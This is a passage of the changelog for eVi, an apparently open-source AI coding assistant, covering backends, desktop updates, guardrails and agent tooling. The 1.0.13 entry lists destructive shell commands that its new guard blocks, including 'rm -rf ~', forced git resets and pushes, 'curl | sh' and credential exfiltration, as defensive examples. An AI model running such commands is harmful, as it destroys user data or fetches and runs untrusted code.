  into the item and rendered as literal backticks, so neither behaviour is
  right; consuming indented blocks into list items is a larger change than this
  fix. `docs/troubleshooting.md` was reflowed to avoid the pattern.

## [1.0.15] — 2026-07-20

### Fixed
- **`evi edit --write` is now checkpointed, so `evi rewind` can undo it.** It
  wrote your source file directly instead of going through the file tools, so
  the one command whose whole job is rewriting a file you already have was the
  one write rewind could not restore.
- **`evi worktree` no longer breaks under a POSIX-style git on Windows.** An
  msys2/Cygwin/Git-Bash git prints POSIX paths, so `repo_root()` returned an
  unusable path and every worktree command died with a bare
  `NotADirectoryError` (WinError 267). This hit anyone whose PATH puts such a
  git ahead of Git for Windows. Path handling now verifies what git reports and
  falls back to locating `.git` directly, which needs no translation; the error
  message names the likely cause if it still can't resolve. Note that string
  rewriting alone cannot fix this — msys maps drives through a user-editable
  mount table, so `C:\proj` may print as `/c/proj` while `C:\Users\me\proj`
  prints as `/home/me/proj`.

### Added
- **`evi worktree remove` now confirms before discarding work.** It
  force-removed silently. Commits *on a branch* stay on that branch, so
  removing a clean worktree is unchanged and still needs no prompt. You are
  asked when there is something to lose: uncommitted changes, a **detached
  HEAD whose commits no branch contains** (removal would strand them), or a
  worktree eVi cannot inspect. Pass `--yes`/`-y` to skip the prompt; running
  non-interactively in those cases refuses rather than destroying work
  unattended. A worktree whose directory is already gone has nothing to lose
  and is removed without prompting, so idempotent teardown scripts keep
  working.
- **Destructive-command guard covers `git worktree remove --force`.** The
  denylist already prompted on `git clean -f`, `git checkout -- <path>` and
  `git reset --hard`; this closes the same class. Only the *forced* variant
  matches, since plain `git worktree remove` already refuses when dirty. As
  with every rule, a headless run (scheduler, `--yes` automation) denies it
  outright rather than prompting; `destructive_disable_rules =
  ["git-worktree-remove-force"]` opts out.

### Internal
- The release workflow now runs `ruff` before publishing, so a lint failure
  can no longer reach PyPI. No user-visible effect.

## [1.0.14] — 2026-07-19

### Fixed
- **`--safe-mode` now actually disables every customization.** The flag existed
  but only the CLI honoured it, and several channels slipped through even there
  — a clean boot that still loads your broken thing is worse than none. Safe
  mode now applies to the **web and desktop** UI too (enforced centrally in
  `build_agent`, so subagents, dream and the scheduler inherit it), and closes:
  config overlays (a profile or a repo's `.evi.toml` could re-pin a model,
  re-point `output_style` at the broken style file, or flip tool toggles — safe
  mode now means *stock config*), project context re-injected by a later `/cd`,
  hooks loaded directly by `evi review`/the SDK, user output styles (a
  `~/.evi/styles/<name>.md` overrides the builtin of the same name), the
  `remember`/`recall`/`invoke_skill` **tools** (module-level stores survived the
  prompt-side flags), REPL tab-completion of user commands, and
  `~/.evi/keybindings.toml`. External MCP servers are no longer spawned by the
  web server either.
  Inspection commands (`evi plugin list`, `evi skill list`, `evi config show`)
  deliberately keep working — in safe mode you need them to find the culprit.
  See *Troubleshooting → Safe mode* for the full matrix.

## [1.0.13] — 2026-07-19

### Added
- **Destructive-command guard for the shell tool — on by default.** eVi shipped
  no curated protection for destructive shell commands; a fresh install was
  unguarded until you hand-wrote `hard_deny` globs. A new deterministic gate
  (`evi/shell_guard.py`, 54 cross-platform rules covering bash/zsh, PowerShell
  and cmd) means commands like `rm -rf ~`, `git reset --hard`, `git push
  --force`, disk formats, `curl | sh`, credential exfil, `terraform destroy` or
  clearing shadow copies **can never run silently**: a match forces a
  confirmation prompt, and is **denied** when there is no UI to confirm with
  (headless / scheduler / MCP). It sits above `yolo`, `accept_edits`,
  auto-approve and `/auto on`, and covers every shell-executing tool.
  Everyday commands are deliberately untouched — `rm -rf ./build`, `rm -rf
  node_modules`, `git reset --soft`, `git branch -d`, `chmod 644`, `terraform
  plan`, `apt remove <app>` and `cat id_rsa.pub` all run as normal.
  Tune with `[auto] block_destructive` (default `true`), `destructive_allow`
  (whole-command globs, e.g. `"*--force-with-lease*"`) and
  `destructive_disable_rules` (per-rule opt-out). An explicit *specific* allow
  rule (e.g. `allow shell *--force*`) clears the guard; a broad `allow shell`
  does not. See *Configuration → `[auto]`*.

## [1.0.12] — 2026-07-13

### Added
- **Desktop: "Automatically update the core" toggle.** The desktop app's
  background core-update (the `evi-server` sidecar update channel) is now a
  setting — **Settings → Desktop** — instead of env-var-only. It maps to a new
  `[desktop] sidecar_auto_update` config key (default on); turn it off to pin the
  core to the installed version. The `EVI_SIDECAR_UPDATE=0` env var still forces
  it off. (The shell reads it at launch, so it takes effect with this release's
  rebuilt desktop shell.)

## [1.0.11] — 2026-07-13

### Fixed
- **Settings / Model picker no longer stalls ~5s when a local backend is down.**
  Opening Settings or the model picker enumerates every enabled backend's models
  over HTTP; that path used the 120s chat timeout against `localhost` URLs and
  skipped the fast socket pre-check, so a configured-but-not-running local backend
  (e.g. LM Studio on :1234) stalled the panel for seconds on Windows' dual-stack
  loopback (`::1` SYN-filtered → full connect timeout). Model listing now
  fast-fails via a socket probe + `localhost`→127.0.0.1 normalisation — a down
  backend returns empty in **~0.4s instead of ~5s**.

### Added
- **More settings surfaced in the Settings panel.** Config that was previously
  `config.toml`/CLI-only is now editable in the web/desktop UI: `reasoning_effort:
  off`, **fallback models**, **format-on-edit** / **check-on-edit**, **transcript
  retention**, the **web-search backend** (ddg/searxng/ollama) + SearXNG URL,
  **completion notifications** (sound / desktop toast / ntfy-webhook), the
  `[ultracode]` **fan-out master toggles** (the per-backend fan-out flag no longer
  does nothing without them), and the `[federation] a2a` interop-endpoint toggle.

## [1.0.10] — 2026-07-12

### Added
- **Desktop: sidecar update channel.** The desktop app can now update its frozen
  Python core (`evi-server`) independently of the Tauri shell. On launch it
  background-fetches a **minisign-signed** manifest and, if a newer,
  ABI-compatible sidecar exists, downloads + verifies (minisign + sha256) + stages
  it — applied on the **next launch**, with last-known-good rollback if it fails
  `--check`. So core updates can arrive at PyPI cadence without a full 3-OS app
  rebuild. Opt out with `EVI_SIDECAR_UPDATE=0`. (This release establishes the
  channel; it's a no-op until a newer sidecar is published to it.)

### Documentation
- **A2A (Agent2Agent) documented.** Added a *Federation → A2A* section to
  `docs/configuration.md` (the adapter itself shipped in 1.0.3): the public
  agent-card, the `[federation] a2a = true` `POST /a2a` JSON-RPC endpoint, and the
  `delegate_a2a` tool. Also recorded the OS code-signing research (Windows free via
  SignPath Foundation; macOS notarization needs a paid Apple Developer ID).

## [1.0.9] — 2026-07-11

### Fixed
- **Linux desktop build restored + a 250 MB sidecar bloat removed.** 1.0.7's
  desktop `claude-agent` bundling used PyInstaller `--collect-all claude_agent_sdk`,
  which pulled in the SDK's vendored `_bundled/claude` CLI (~250 MB) — that broke the
  Linux AppImage bundler (`failed to run linuxdeploy`) and bloated every platform's
  sidecar. The freeze now collects only the SDK's Python modules; the SDK falls back
  to the system `claude` CLI (already required for `claude_agent`), so nothing is
  lost. (No PyPI-visible change; this is a desktop-build fix.)

## [1.0.8] — 2026-07-11

### Fixed
- **Honest model identity for non-local backends.** eVi's system prompt always
  described itself as "running the local open-weight model `X`" and denied being
  Claude/GPT/Gemini — false for the CLI-agent and online backends, where the model
  genuinely is proprietary (e.g. `claude_agent` → Claude Opus, which reported "I'm
  eVi, running the local open-weight model `opus`"). The identity is now
  backend-aware: the anti-hallucination wording applies only to local open-weight
  backends (`ollama`/`lmstudio`/`llamacpp`); for `openai_compat` and the CLI-agent
  backends eVi names the model honestly and no longer claims to be open-weight or
  purely local.
- **Linux desktop AppImage build hardened.** Set `APPIMAGE_EXTRACT_AND_RUN=1` /
  `NO_STRIP` so AppImage bundling doesn't intermittently fail with "failed to run
  linuxdeploy" on GitHub's FUSE-less ubuntu runners.

## [1.0.7] — 2026-07-11

### Fixed
- **CLI-agent backends no longer show a false "isn't running" warning.** The
  backend health check probed for a reachable HTTP port — which the CLI-agent
  backends (`claude_agent`/`codex`/`gemini`/`amp`/`qwen`/`copilot`) don't have — so
  selecting one flagged it as down and offered to switch you back to Ollama. It now
  checks whether that backend's CLI is on PATH instead, and the banner (only when
  the CLI is genuinely missing) tells you to install and log in to that CLI rather
  than pointing you at a local server.
- **`claude_agent` now works in the packaged desktop app.** The Claude Agent SDK
  (`claude-agent-sdk`) is bundled into the frozen sidecar, so the `claude_agent`
  backend works in the desktop build too (it still needs the `claude` CLI installed
  and logged in on the machine, as the other CLI-agent backends need their CLI).

## [1.0.6] — 2026-07-11

### Fixed
- **Add CLI-agent backends from Settings.** The web/desktop **Settings → Model &
  Backend** "custom…" kind dropdown now lists the six CLI-agent kinds
  (`claude_agent`, `codex`, `gemini`, `amp`, `qwen`, `copilot`) alongside the
  local server kinds — previously only `openai_compat`/`ollama`/`lmstudio`/
  `llamacpp` were selectable, so these subscription/login backends could only be
  added from the `evi backend add --kind` CLI. Selecting a CLI-agent kind hides
  the URL + API-key fields (they need neither) and shows a reminder to install and
  log in to that CLI first.

### Changed
- **Desktop now auto-follows the core.** Every PyPI `v*` release also cuts the
  matching `desktop-v*` build (`release.yml` calls `desktop-release.yml`), with the
  desktop version derived from the tag, so the desktop app no longer lags the
  package. (1.0.6 is the first release built this way.)

## [1.0.5] — 2026-07-11

### Added
- **Sourcegraph Amp CLI backend — your Amp subscription (no model API key).** Adds
  an `amp` backend over the local **`amp` CLI**, authenticated by `amp login` (an
  Amp subscription / credit balance) or an `AMP_API_KEY` access token. eVi runs
  `amp -x --stream-json` and streams the reply; the model is chosen by **agent
  mode** (`medium`/`low`/`high`). A chat/delegate provider — Amp is autonomous and
  can use tools per your `amp permissions`. Because an unauthenticated `amp` opens
  an interactive browser login that would block, eVi **refuses to start Amp without
  evidence of auth** (`AMP_API_KEY` or a saved login) and bounds each turn with a
  timeout. Requires `npm i -g @sourcegraph/amp`.
- **Qwen Code CLI backend — free Qwen OAuth (no API key).** Adds a `qwen` backend
  over **Qwen Code** (Alibaba's gemini-cli fork): sign in free with a qwen.ai
  account (~2000 req/day). eVi runs `qwen -p … -o json` (Claude-Code-style events)
  and streams the reply — chat/delegate, like `gemini`; models `qwen3-coder-plus` /
  `qwen3-coder-flash`. Requires `npm i -g @qwen-code/qwen-code` + a one-time login.
- **GitHub Copilot CLI backend — your Copilot subscription (no model API key).**
  Adds a `copilot` backend over the local **`copilot` CLI** (`@github/copilot`),
  authenticated by `copilot login`. eVi runs `copilot -p … --output-format text -s`
  and streams the reply; `--model auto` lets Copilot pick (or `claude-sonnet-4.5` /
  `gpt-5`, plan-dependent). Chat/delegate — unapproved tool calls are auto-denied
  in non-interactive mode, so a chat turn stays answer-only. Requires
  `npm i -g @github/copilot`.

### Changed
- **Shared Claude-Code stream-json parser in the CLI-agent shim.** `amp` and `qwen`
  both speak Claude Code's `stream-json` event schema (`assistant` text blocks + a
  terminal `result` with usage/error), so the parser now lives once in
  `evi/llm/cli_agent.py` (`emit_claude_events` + `cc_usage`/`cc_error_message`) and
  is shared by both. Six subscription/free-login CLI backends now ride the shim:
  `claude_agent`, `codex`, `gemini`, `amp`, `qwen`, `copilot`.

## [1.0.4] — 2026-07-10

### Added
- **Codex CLI backend — OpenAI Codex via your ChatGPT plan (no API key).** Adds a
  `codex` backend that talks to Claude-Code's counterpart, the local **`codex`
  CLI**, authenticated by `codex login` (ChatGPT Plus/Pro/Business) — no
  `OPENAI_API_KEY`. Pick it in **Settings → Model & Backend** (kind `codex`, no
  URL/key) or `evi backend add codex --kind codex`; models are `gpt-5-codex` /
  `gpt-5`. Codex is an autonomous agent that runs its **own** tools, so it's a
  chat/delegate provider (eVi's tools don't route through it; it runs read-only so
  a chat turn can't edit files). Requires `npm i -g @openai/codex` + `codex login`.
- **Gemini CLI backend — Google Gemini via the free login (no API key).** Adds a
  `gemini` backend over the local **`gemini` CLI**: a Google-account login gives a
  generous free tier (~1000 req/day) with no `GEMINI_API_KEY`. Pick it in
  **Settings → Model & Backend** (kind `gemini`, no URL/key) or `evi backend add
  gemini --kind gemini`; models `gemini-2.5-pro` / `gemini-2.5-flash`. Runs
  `gemini -p … -o json` (chat/delegate provider, like `codex`). Requires
  `npm i -g @google/gemini-cli` + a one-time `gemini` login.

### Changed
- **Shared CLI-agent shim (`evi/llm/cli_agent.py`).** Factored the reusable core
  out of the `claude_agent` backend — the OpenAI-shaped chunk builders, the
  async/subprocess→sync bridge, the `chat.completions` client shell, and the
  `render_transcript` helper are now generic and driven by a small per-CLI
  "driver". `claude_agent` (SDK driver), `codex` (`codex exec --json` subprocess),
  and `gemini` (`gemini -o json` subprocess) are thin consumers, so further
  subscription/free-login CLIs are cheap to add. No behavior change to
  `claude_agent` (re-verified end-to-end on a Max plan).

## [1.0.3] — 2026-07-10

### Added
- **Claude via your Max/Pro plan — no API key (`claude_agent` backend).** Adds a
  new backend that talks to Claude through the local **`claude` CLI** (the Claude
  Agent SDK), authenticating with your Claude subscription login instead of an
  `ANTHROPIC_API_KEY`. Pick it in **Settings → Model & Backend** (kind
  `claude_agent`, no URL/key) or `evi backend add claude --kind claude_agent`;
  models are the `opus`/`sonnet`/`haiku` aliases the CLI resolves to your plan's
  current models. **Full tool-calling parity:** eVi keeps driving its own tools
  (permissions, checkpoints, mode-scoped toolsets, tool-activity UI all work) —
  the SDK is coerced into proposing one tool call at a time, which eVi executes.
  Requires `pip install 'evi-assistant[claude-agent]'` + the `claude` CLI logged
  in. Under the hood: a stateless per-turn shim (`evi/llm/claude_agent.py`) that
  adapts the SDK's async agent loop into the OpenAI `chat.completions` streaming
  surface the agent loop already speaks, so CLI / web / headless / ultracode /
  subagents all use it unchanged.

## [1.0.2] — 2026-07-10

### Added
- **Multiple model backends at once.** eVi now keeps a registry of backends
  (`~/.evi/backends.json`) — local (ollama / lmstudio / llamacpp) and online via
  presets (openai / xai / anthropic / openrouter / groq / together, base URL
  pre-filled, just supply a key — inline or an `env:VARNAME` reference). The
  **model picker aggregates models across all of them**, each tagged with its
  **source backend** (hover shows the provider); selecting a model also switches
  the active backend. Manage in **Settings → Model & Backend** (add from a preset
  or a custom endpoint, per-backend **enabled** + **fan-out** toggles, remove) or
  via `evi backend list/add/remove/use` / the `/api/backends` endpoints. A
  per-backend **"allow for subagent fan-out"** flag marks which providers' models
  may serve delegated subagents (the eligible pool for multi-model fan-out).
  `[llm]` stays the materialized active backend, so nothing else changed underneath.
- **Multi-backend fan-out for ultracode.** With `[ultracode] fanout = true`, the
  parallel SOLVER angles are spread — round-robin, interleaved by provider —
  across every model on backends flagged **fan-out** in the registry, so one run
  can use several providers at once (a big cloud model for some angles, locals for
  others). Opt in per backend via the Settings → Model & Backend "fan-out"
  checkbox (or `evi backend add --fanout`); no-op if none are flagged. Built on a
  new `build_agent(backend=…)` that binds an agent to a specific registry backend.
- **A2A (Agent2Agent) adapter — interop with any standards-compliant agent.**
  Complements eVi's own federation (the zero-dep *private fast path* for your own
  eVis) with the *interop path*:
  - **Agent Card** at `/.well-known/agent-card.json` — a spec-compliant A2A
    `AgentCard` (protocolVersion, capabilities, skills, securitySchemes) that also
    carries eVi's model capability flags under an `x-evi` extension. Served
    always, auth-exempt (discovery is public).
  - **`POST /a2a`** JSON-RPC endpoint — `message/send`, `tasks/get`,
    `tasks/cancel`. Off unless `[federation] a2a = true`; bearer-token-gated and
    run non-interactively (tools not auto-approved are denied), same as
    `/api/federate`. Streaming (`message/stream`) + push are not implemented yet
    (the card advertises `streaming: false`).
  - **`delegate_a2a` tool** — eVi can call *any* external A2A agent by its
    JSON-RPC URL.
- **Federation capability discovery (the A2A Agent-Card idea, applied locally).**
  `/api/health` now carries model capability flags (vision / tools / reasoning /
  audio) so a LAN scan / `check_peer` learns what a peer can do in one request,
  and a new **`list_peers`** tool lets the model pick the right peer *before*
  `delegate_peer` (e.g. route a vision task to the peer whose model has vision).

### Fixed
- **Switching the model mid-session now actually registers.** The system prompt
  (which carries the model identity) was composed once at session start and
  frozen, so after a model switch the assistant kept reporting the *old* model.
  Every switch path (`/api/model-picker`, `/api/backend/use`, the `/model`
  command) now re-stitches the prompt via a new `Agent.refresh_prompt()`. The
  web header (`model=…`) also refreshes on switch instead of showing the model
  from page load.

## [1.0.1] — 2026-07-01

### Fixed
- **Model identity.** The system prompt now names the running local model and
  explicitly disclaims being GPT-4 / ChatGPT / Claude, so local models stop
  answering "I'm based on OpenAI's GPT-4" when asked what they are. It also nudges
  the model against firing tools for greetings / small talk.
- **No more raw tool-call JSON in the chat.** When a local model emits a tool call
  as a text JSON blob (common with qwen via Ollama), eVi recovers it as a real
  tool call and no longer flashes the raw `{"name": …}` JSON as a chat message.
  Genuine JSON replies still render (held, then flushed if not a tool call).

## [1.0.0] — 2026-07-01

**eVi 1.0 — first stable public release.** The project is now developed in the
open at [`evi-assistant/evi-ai`](https://github.com/evi-assistant/evi-ai) (MIT).
No breaking API changes from 0.40.0 — 1.0.0 marks stability, a public repo, and a
coordinated launch across the PyPI package, the desktop app, and the
[`evi-skills`](https://github.com/evi-assistant/evi-skills) catalog.

Everything from the 0.34–0.40 line is in 1.0: specialty SLMs + capability chips
(vision/thinking/infill/audio/tools/guard/embeddings), the guard-model guardrail
layer, the models.dev catalog, the config linter (`evi lint`), completion
notifications, pluggable web search, `evi skill add`, the project-intelligence
pack (anatomy map, bug ledger, session reflection), the VS Code extension, local
FIM completion, federation, ultracode, and the full CLI/web/desktop parity set.

### Changed
- `Development Status` classifier → Production/Stable.
- Desktop releases build the full Windows/macOS/Linux matrix and serve the
  in-app updater directly from the public repo (the private release-mirror
  channel is retired).

### Fixed
- Flaky `test_url_hook_non_2xx_vetoes` (HTTP hook test now drains the request
  body before responding, avoiding an intermittent connection-reset race).

## [0.40.0] — 2026-06-17

### Added — project-intelligence pack (feature-scan Batch C)
- **Project anatomy map** — `evi anatomy [--write]` builds a token-estimated file
  map (git-aware) so the agent budgets reads instead of blindly opening files.
  Written to `.evi/anatomy.md` and auto-injected into project context when present
  (`evi/anatomy.py`).
- **Bug-fix ledger** — per-project `.evi/bug-ledger.jsonl` with `record_fix` /
  `search_fixes` tools so the agent checks past fixes before retrying a repair
  (`evi/bugledger.py`).
- **Session reflection** — `evi reflect` distills durable preferences/corrections
  from recent sessions into long-term memory (`evi/reflect.py`); model call is
  injected so it's testable.

### Fixes (from an adversarial review of this batch)
- reflect: robust JSON extraction (handles brackets in surrounding prose), name
  slugification (non-slug names normalised, not dropped), and no clobbering of a
  hand-authored memory on a name collision (+ in-batch dedupe).
- anatomy: git mode now honours the same ignore filter as the walk (drops `.evi/`
  & binaries), keeps non-ASCII filenames (`core.quotepath=false`), no longer
  drops files merely *named* like an ignored dir, and flags char-cap truncation.

## [0.39.0] — 2026-06-17

### Added — models.dev catalog + config linter (feature-scan Batch B)
- **models.dev catalog** — `evi/modelsdev.py` consults a model-metadata catalog
  for ground-truth capability flags + context window + (hosted) pricing. A baked
  snapshot (`evi/data/models-catalog.json`) ships for offline use; `evi models
  refresh` downloads the full live catalog to `~/.evi/models-catalog.json`.
  `capabilities()` and `recommend.context_window_for()` now prefer the catalog
  and fall back to the existing heuristics for any model it doesn't list (exact +
  canonical id match only — no loose substring matching that could mis-resolve).
- **Config linter** — `evi lint` validates authored resources (skills, hooks,
  commands, guardrails, agents): missing SKILL.md `description`, oversized
  bodies, broken file refs, typo'd hook events, unparseable agents.toml. Reuses
  the existing per-resource validators. `evi lint --path ./skills` is the CI gate
  for an evi-skills repo (`evi/configlint.py`).

## [0.38.0] — 2026-06-17

### Added — Tier-1 fold-ins (from the AI-dev-tool feature scan)
- **Completion notifications** — `evi/notify.py` + `[notify]` config (off by
  default). The CLI pings on turn-done (sound + native toast on macOS/Linux +
  optional ntfy/webhook URL); the web/desktop UI fires a browser Notification
  via a 🔔 toggle when the tab is backgrounded. Walk away from long local turns.
- **check-on-edit** — `[tools] check_on_edit` runs the linter after a write and
  folds diagnostics into the tool result (cheap LSP-lite feedback), alongside
  `format_on_edit`. `codeintel.diagnose` now keys off the linter exit code so
  clean banners ("All checks passed!") aren't mistaken for findings.
- **Pluggable web search** — `[tools] search_backend = ddg | searxng | ollama`;
  SearXNG is the fully self-hosted, keyless option. DuckDuckGo stays the default.
- **`evi skill add <name|git|zip|dir>`** — one-line skill installer; the
  marketplace index now carries a `skills` section (`load_skill_index`).

### Security / fixes (from an adversarial review of this batch)
- Skill `.zip` install no longer requires `plugin.toml` (extract + find SKILL.md);
  download/unzip is now a shared `plugins.download_and_unzip` helper.
- `git clone` for skill/plugin sources now uses `--` and rejects `-`-leading
  sources (closes an option-injection vector via a malicious/MITM'd index).
- Multi-skill repos require `--name` to disambiguate instead of silently
  installing whichever sorts first; plugin download errors surface as `SkillError`.

## [0.37.0] — 2026-06-17

### Added — specialty SLMs + capability chips
- **Safety-guard model layer** 🛡 — a new `[[guard]]` guardrail kind backed by a
  dedicated generative guard model (Llama Guard 3 / ShieldGemma, set via
  `[models] guard`). It's the 4th guardrail layer (regex → judge → classifier →
  guard), classifies each turn against the model's built-in safety taxonomy, and
  fails *open* like the others. New `evi/guardmodel.py`; a 🛡 capability chip
  marks guard models in the picker so they're not mistaken for chat models.
- **Embeddings / reranker chip** ◆ — the picker now flags embedding and
  cross-encoder/reranker model families (`evi/embedcap.py`), so a
  nomic-embed / bge-reranker id reads as a model *class*, not a chat model.
- **Speaker diarization** — `evi/diarize.py` + `evi voice diarize <audio>`
  ("who spoke when", pyannote.audio). Optional `[diarize]` extra; degrades
  gracefully when the deps/HF-token are missing.
- **Document layout / OCR** — `evi/doclayout.py` + `ocr_image(engine="doc")`
  (Docling: layout-aware PDF/scanned-doc → Markdown). Optional `[doc]` extra.
- `evi models specialty` now manages `guard` / `diarize` / `doc_layout` too.

## [0.36.1] — 2026-06-17

### Added
- **Tool-calling capability chip** 🔧 — the model picker (web + status bar) now
  shows whether the selected model's family is known to do OpenAI-style
  function calling. eVi is an agent: a model that can't tool-call silently
  produces prose instead of acting, and there was no signal for it. Detection
  lives in `evi/toolcalling.py` (known-good families, with anti-hints so
  base/FIM/embedding/guard models don't false-positive), wired through
  `capabilities()` like the vision/thinking/infill/audio chips.

## [0.36.0] — 2026-06-17

### Added — last parity gaps closed
- **Skill tool-scoping** — a SKILL.md may declare `allowed-tools` /
  `disallowed-tools`; while that skill is active the agent's toolset is scoped
  accordingly (`evi/skillscope.py`), and a stray out-of-scope call is refused.
  This was the last buildable Claude Code parity gap.
- **Channels → live session** — `POST /api/session/{id}/channel` with
  `run: true` drives an immediate agent turn on the session (webhook can act
  now), not just a note for the next turn.
- **Packaged CI action** — ready-to-copy `examples/github/pr-review.yml` using
  the existing `evi-run` composite action (PR review → comment).

### Validated
- The 0.35.0 **Python 3.13** floor is now verified locally too (fresh 3.13
  venv: full suite green, **fast-walk active** for `python_symbols`), in
  addition to CI on 3.13.

## [0.35.0] — 2026-06-16

### Changed (breaking)
- **Minimum Python is now 3.13** (was 3.11). Dropped the `tomli` fallback;
  updated CI, Dockerfile (`3.13-slim`), install scripts, the Tauri launcher,
  and docs. **0.34.x is the last 3.11/3.12-compatible release.** Recreate a
  local dev venv with 3.13 (`py -3.13 -m venv .venv`).

### Added
- **`python_symbols` tool** — AST outline of a Python file (functions/classes/
  methods/imports) for fast code navigation (`evi/pyanalyze.py`).
- **Optional `[ast]` extra** — Reflex **fast-walk** (Rust `ast.walk`, 3.13+
  wheels) accelerates `python_symbols`; `evi/pyanalyze.py` falls back to stdlib
  `ast.walk` when it isn't installed. `pip install 'evi-assistant[ast]'`.
- **eVi VS Code extension — Phase 3 polish** (`editors/vscode/`): status-bar
  item shows reachability + autocomplete on/off + active model (click to
  toggle), 30 s re-check, and a graceful "server not reachable — run evi web"
  prompt.

## [0.34.1] — 2026-06-16

### Fixed
- **run_python in the desktop app** — in the frozen sidecar `sys.executable` is
  `evi-server.exe`, so `run_python` ran the server binary
  (`evi-server: error: unrecognized arguments: …snippet.py`) instead of Python.
  It now finds a real interpreter on PATH when frozen, with a clear error if
  none. (run_python is for quick scripts, not GUI/long-running apps — write the
  file or use the shell tool for those.)

### Added
- **Model capability indicators** — the web model-picker shows capability chips
  (👁 vision · 🧠 thinking · ⌨ infill · 🎤 audio · ☁ Responses-API) on the footer
  chip and per model in the popover; new `evi/capabilities.py` + `capabilities`
  in `/api/model-picker`.
- **Federation receiver indicator** — `/api/federate` records inbound peer
  activity; the footer shows a ⇄ "serving a peer request (host)" pill; the
  dispatch snapshot exposes `federation: {active, recent}`; `delegate()` sends
  the sender's hostname.
- **eVi for VS Code** (`editors/vscode/`) — a local Tab (inline FIM) + chat
  extension over `/api/complete` and `/api/chat`. Run with F5 or package to VSIX.

## [0.34.0] — 2026-06-16

### Added — specialty SLMs, working folder, opencode + Cursor gleanings

- **Specialty-model framework** — `[models]` registry (ocr/vision/stt/tts) +
  `SpecialtyRegistry` so a small dedicated model handles a task without
  swapping the main model. `describe_image` tool + OCR-VLM routing in
  `ocr_image` (falls back to tesseract); `evi models specialty list/set/clear`.
- **Voice models** — Kokoro-82M TTS engine (CPU real-time, Apache); STT default
  reads `[models] stt` (e.g. `large-v3-turbo`).
- **Working folder** — per-session cwd (`evi.workdir`): `/cd`, `evi chat --cwd`,
  web `📁` chip + `/api/session/cwd`. File tools resolve relative paths against it.
- **Shell tool** — `run_command` (opt-in `[tools] shell`, permission-gated),
  wiring the previously-dangling `shell` category.
- **Editing** — `apply_patch` (multi-hunk SEARCH/REPLACE in one call);
  `[tools] format_on_edit` (ruff/black/prettier/gofmt/rustfmt); `check_file`
  diagnostics (ruff/eslint/go vet/clippy) — LSP-lite, no server.
- **Local FIM completion** — `evi/complete.py` + `evi complete` + `/api/complete`:
  eVi as a fully-local Tab/Copilot backend for an editor extension.
- **Plan/build toggle** — `/plan on|off` (persistent read-only mode).
- **`evi init`** — scaffold AGENTS.md/EVI.md (discovery already merges up the tree).
- **Bugbot-style review** — `evi review` loads `.evi/BUGBOT.md` + learned rules
  (`evi review-remember`), tags findings by severity; composes with --json/--exit-code.
- **Federation guard** — `evi doctor` / `evi peer scan` warn when serving but
  loopback-bound (the desktop-0.2.14 trap).

### Notes

- Desktop **0.2.16** shipped separately (bundles the 0.33.0 batch). A 0.2.17
  with this batch follows. SLM models are user-pulled (e.g. `ollama pull
  moondream` / `glm-ocr`); eVi wires the integration, config, and tools.

## [0.33.0] — 2026-06-16

### Added — Claude Code parity, S/M batch

Closes the buildable small/medium gaps from the
[comparison](docs/claude-code-comparison.md):

- **Model fallback chain** — `[llm] fallback_models` retries a turn against the
  next model when the primary fails at setup (timeout / 5xx / not loaded).
- **Extended thinking off** — `reasoning_effort = "off"` (and `/effort off`)
  disables thinking; logic centralized in `reasoning.py`.
- **Transcript retention** — `tools.cleanup_period_days` auto-prunes old
  transcripts on startup; `evi sessions purge [--older-than N]` does it manually.
- **Transcript search** — `evi sessions search <query>` with snippets.
- **MCP output cap** — `tools.mcp_max_output_chars` truncates a chatty server's
  result before it reaches the model.
- **Conditional hooks** — `arg_match` gates a hook on tool arguments (e.g.
  `arg_match = { path = "*.env" }`), not just the tool name.
- **Session lifecycle hooks** — `session_start` / `session_end`.
- **CI-gating review** — `evi review --exit-code` / `--json` (+ `/ultrareview`)
  for gating a build on a clean verdict.
- **Plugins** — `evi plugin init` scaffold; install from `.zip` (file or URL);
  enabled plugins' `bin/` on PATH; nested (subfolder) skill discovery;
  `/reload-skills`.
- **`/add-dir`** — trust an extra directory for the session.
- **`!cmd`** — run a shell command from the REPL; output folded into context.
- **`ask_user` tool** — clarifying questions (AskUserQuestion parity);
  interactive-only, a graceful no-op in web/headless.
- **`worktree.base_ref`** — default fork point for `evi worktree create`.
- **Usage by category** — `evi stats` attributes tool calls per category.

### Notes

- Desktop **0.2.15** shipped separately (updater ACL fix + federation LAN-bind);
  install it manually once — 0.2.14's updater can't self-update.

## [0.32.0] — 2026-06-16

No entry was written when this version shipped. This one is reconstructed from
all 75 of its commits (`git log v0.31.0..v0.32.0`), grouped by area; it covers
roadmap phases 79–94 and everything after them up to the tag. Desktop → 0.2.14.

### Added
- **Agent SDK** (`evi.sdk`) — `build_agent` plus curated re-exports.
- **Ultracode** — an exhaustive multi-agent pipeline (`evi ultracode` / `/ultra`)
  with per-stage model routing for cheaper fan-out.
- **Agent teams** — a shared, claimable task list with a lead and teammates.
- **Dynamic workflows and an agent dispatch view** (Phases 85–86); plugins can
  ship subagent profiles, run through a generic delegate tool.
- **Agent tooling** — `edit_file`, recovery of tool calls a model writes out as
  text, `read_file` pagination, `find_files` / `search_files` (glob / grep),
  `evi agents new` for custom subagents, and tool search at scale (the long tail
  deferred behind `search_tools`).
- **Structured outputs** — answers constrained to a JSON Schema via `/schema`,
  `evi run --schema` and `output_schema` on `/api/chat`.
- **Headless batches and evals** — `evi batch` runs many prompts to JSONL;
  `evi eval` regression-tests prompts, skills and models, with LLM-as-judge
  assertions, and eval suites can run on a cron (scheduled evals, for drift).
- **Usage analytics** — `evi stats`, local usage stats from transcripts.
- **Hooks** — lifecycle events (`user_prompt_submit`, `before_compact`, `stop`),
  an HTTP hook type (Phase 81), a hooks editor and `evi hooks list/test`.
- **Plugins** — plugins bundle hooks and MCP servers, not just commands and
  skills (Phase 80), and a marketplace index searches and installs plugins by
  name.
- **Skills** — import Claude skills (their bundled files are exposed to the
  model), plus `evi skill show` and `evi skill remove`.
- **Guardrails** — semantic LLM-judge rules alongside regex, and an offline ML
  classifier rule type (`[[classifier]]`).
- **Web server** — opt-in multi-user logins with per-user tokens and per-user
  workspaces (sessions, transcripts and memory kept apart); channels that push
  an external alert into a live session (Phase 83); cross-device session
  handoff (Phase 87).
- **Federation** — eVi-to-eVi delegation over the web transport, and a Peers
  panel with LAN scan.
- **Responses API** — server-side built-in tools on the Responses API path.
- **MCP** — an HTTP/SSE client transport for remote servers, and server
  management from the CLI and Settings → MCP.
- **Models** — online provider presets with env-var API keys, a fast/small
  model tier with a recommender (`evi models use --fast`), and long-context
  awareness in the model registry.
- **Web UI** — Settings panels for Guardrails, Plugins, Usage, Evals and
